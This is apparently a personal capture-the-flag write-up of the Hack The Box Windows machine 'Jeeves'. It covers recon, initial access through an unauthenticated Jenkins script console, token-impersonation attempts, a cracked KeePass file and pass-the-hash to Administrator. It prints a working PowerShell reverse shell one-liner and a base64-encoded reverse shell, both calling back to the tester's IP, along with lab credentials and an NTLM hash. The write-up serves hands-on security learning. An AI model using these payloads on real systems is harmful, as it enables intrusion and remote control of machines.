---
cover: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90d7-0cc5-49c3-be2b-06b1946db205.png
type: windows
level: "2"
status: SOLVED
---
p.s. this writeup with my personal comments and think processes so it isn't so clean as other ones...

# enumeration 
```
nmap -sC -sV -vv 10.129.228.112
```

OUTPUT:
```
PORT      STATE SERVICE      REASON          VERSION
80/tcp    open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-09-24T19:28:02
|_  start_date: 2026-09-24T19:26:38
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m58s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 58009/tcp): CLEAN (Timeout)
|   Check 2 (port 38696/tcp): CLEAN (Timeout)
|   Check 3 (port 39602/udp): CLEAN (Timeout)
|   Check 4 (port 35344/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

we have:
web - 80
smb - 445
rpc - 135
Jetty 9.4.z-SNAPSHOT - 50000


run full scan:
```
sudo nmap -p- --open -T4 10.129.228.112
```

```
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2
```

# Web enum
port 80
![[Pasted image 20260924173331.png]]


when u try to search smt this image is spawning. and it's image and not text...
![[Pasted image 20260924173429.png]]

this is some shit i believe because they gave me image... let's check what on port 5000

# Jenkins - initiall access

as i learned Jetty is like nginx but for java based applications..
![[Pasted image 20260924174738.png]]

i got 404 when trying access it.

fuzz for directories
```
ffuf -u http://10.129.228.112:50000/FUZZ -w /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

output:
```
askjeeves               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 80ms]
```

lets check this dir:
![[Pasted image 20260924175530.png]]
we access jenkins main page idk how. mb there is no password check...

lets enum a little more...

i found script console 
![[Pasted image 20260924180352.png]]

and executed whoami command...

so let's generate reverse shell code:
```
println "powershell -c \"\$c=New-Object System.Net.Sockets.TCPClient('10.10.15.85',4444);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sb2=\$sb+'PS '+(pwd).Path+'> ';\$sq=([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$sq,0,\$sq.Length);\$s.Flush()};\$c.Close()\"".execute().text
```

and we got in
```
PS C:\> whoami
jeeves\kohsuke
```


# Privilege escalation

pupupu
```
PS C:\Users\kohsuke> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
PS C:\Users\kohsuke> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
PS C:\Users\kohsuke>
```

i think i need to dig this way `SeImpersonatePrivilege`

the output of `systeminfo` command
![[Pasted image 20260924181739.png]]

lets try to run
```
PS C:\Users\kohsuke> .\RoguePotato.exe -r 10.10.15.85 -l 9001 -e "C:\windows\system32\cmd.exe"
[+] Starting RoguePotato...
[*] Creating Rogue OXID resolver thread
[*] Creating Pipe Server thread..
[*] Creating TriggerDCOM thread...
[*] Starting RogueOxidResolver RPC Server listening on port 9001 ... 
[*] Listening on pipe \\.\pipe\RoguePotato\pipe\epmapper, waiting for client to connect
[*] Calling CoGetInstanceFromIStorage with CLSID:{4991d34b-80a1-4291-83b6-3328366b9097}
[*] IStoragetrigger written:104 bytes
[-] Named pipe didn't received any connect request. Exiting ...
```
shit ... mb it's rabbit hole ... or idk how to exploit this shit... let's enum...

the next thing i did a little enum and found this file `CEH.kdbx`

i transfered to my host via smbserver and cracked it. got password `moonshine1` but the problem i dont know to who it belongs...

the next this i did this
![[Pasted image 20260924184744.png]]
what to do with it now idk for sure...

read this:
> But **this specific entry is a dead end.** `WindowsLive:target=virtualapp/didlogical` is a default Windows artifact — it's a Microsoft/Windows Live SSO token blob that exists on basically _every_ Windows install. The `user: 02yxqkinqhce` is just an auto-generated identifier, not a real account, and it isn't something you can `runas` with or reuse for lateral movement. It's noise. When you see _only_ that entry, treat it as "nothing stored here."

so i dont wanna go there...

tried again exploit seimpersonateprivilege with juicypotato
```
jp.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AOAA1ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" -t *
```
but no use... not going there anymore...

i also tried to run snaffler and lazagne but nothing there. ...

i found info that i can open this CEH.kdbx)) cause it like password manager.......

once i opened it i saw a bunch of entries
![[Pasted image 20260924201752.png]]

showing all entries:
```
kpcli:/CEH> show -f 0

Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL: 
Notes: 

kpcli:/CEH> show -f 1

Title: Bank of America
Uname: Michael321
 Pass: 12345
  URL: https://www.bankofamerica.com
Notes: 

kpcli:/CEH> show -f 2

Title: DC Recovery PW
Uname: administrator
 Pass: S1TjAtJHKsugh9oC4VZl
  URL: 
Notes: 

kpcli:/CEH> show -f 3

Title: EC-Council
Uname: hackerman123
 Pass: pwndyouall!
  URL: https://www.eccouncil.org/programs/certified-ethical-hacker-ceh
Notes: Personal login

kpcli:/CEH> show -f 4

Title: It's a secret
Uname: admin
 Pass: F7WhTrSFDKB6sxHU1cUn
  URL: http://localhost:8180/secret.jsp
Notes: 

kpcli:/CEH> show -f 5

Title: Jenkins admin
Uname: admin
 Pass: 
  URL: http://localhost:8080
Notes: We don't even need creds! Unhackable! 

kpcli:/CEH> show -f 6

Title: Keys to the kingdom
Uname: bob
 Pass: lCEUnYPjNfIuPZSzOySA
  URL: 
Notes: 

kpcli:/CEH> show -f 7

Title: Walmart.com
Uname: anonymous
 Pass: Password
  URL: http://www.walmart.com
Notes: Getting my shopping on
```


looking at "backup stuff" we see what? that's fucking right.) it's look like ntlm hash? let's try it on Administrator...

```
netexec smb 10.129.228.112 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00'
SMB         10.129.228.112  445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.129.228.112  445    JEEVES           [+] Jeeves\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
```
let's use impacket-psexec to get in

![[Pasted image 20260924203633.png]]

u think that it is. yes. but no. there is something more...

![[Pasted image 20260924203815.png]]

i really didn't know what to do. but i had a hint... so this is called like ADS. it's like second stream of data written on the same file. if i understood right...

so we had to run this to find flag:
![[Pasted image 20260924204149.png]]

and open it
```
more < hm.txt:root.txt
```
OUTPUT:
```
************60648cec41c6ac92530
```
